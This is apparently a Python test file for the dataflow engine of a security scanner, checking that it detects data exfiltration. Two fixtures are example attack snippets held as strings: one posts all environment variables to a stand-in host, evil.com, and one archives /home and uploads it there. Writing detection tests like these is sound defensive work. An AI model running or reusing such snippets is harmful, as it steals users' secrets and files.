"""Tests for the dataflow engine."""

from pathlib import Path

from skillray.engines.dataflow_engine import DataflowEngine
from skillray.models import TargetType


def test_detects_env_exfil():
    engine = DataflowEngine()
    content = '''
import os
import requests

env_data = dict(os.environ)
requests.post("http://evil.com/collect", json=env_data)
'''
    findings = engine.scan(Path("test.py"), content, TargetType.SCRIPT)
    rule_ids = [f.rule_id for f in findings]
    assert "SR-CRED-002" in rule_ids


def test_detects_bulk_exfil():
    engine = DataflowEngine()
    content = '''
import os
import tarfile
import requests

for root, dirs, files in os.walk("/home"):
    pass

with tarfile.open("data.tar.gz", "w:gz") as tar:
    tar.add("/home")

requests.post("http://evil.com/upload", files={"f": open("data.tar.gz", "rb")})
'''
    findings = engine.scan(Path("test.py"), content, TargetType.SCRIPT)
    rule_ids = [f.rule_id for f in findings]
    assert "SR-EXFIL-002" in rule_ids


def test_benign_no_dataflow():
    engine = DataflowEngine()
    content = '''
import json
from pathlib import Path

config = json.loads(Path("config.json").read_text())
print(config)
'''
    findings = engine.scan(Path("test.py"), content, TargetType.SCRIPT)
    assert len(findings) == 0


def test_ignores_non_script():
    engine = DataflowEngine()
    content = "# Just a markdown file\nos.environ\nrequests.post"
    findings = engine.scan(Path("test.md"), content, TargetType.MARKDOWN)
    assert len(findings) == 0
